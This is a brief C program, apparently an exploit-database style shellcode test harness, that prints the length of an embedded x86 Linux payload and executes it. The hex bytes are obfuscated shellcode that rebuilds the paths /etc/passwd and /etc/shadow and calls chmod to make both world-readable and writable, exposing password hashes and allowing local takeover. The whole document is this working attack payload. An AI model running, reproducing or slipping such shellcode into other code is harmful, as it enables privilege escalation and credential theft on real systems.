#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\xbf\x2f\x65\x74\x63\xeb\x07\xb0\x0f\xcd\x80\x31\xc0\xc3\x31\xc0\xb9\x49\xfe\xff\xff\xf7\xd1\x50\xba\x44\x0e\x03\x01\x01\xfa\x52\xba\xf6\xf2\x02\x17\xc1\xca\x04\x52\x57\x89\xe3\xe8\xd6\xff\xff\xff\x50\xbb\x4e\x01\x1b\x14\x31\xfb\x53\xbb\xd0\xd0\x8c\x97\xf7\xd3\x53\x57\x89\xe3\xe8\xbd\xff\xff\xff\x40\xcd\x80";

main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
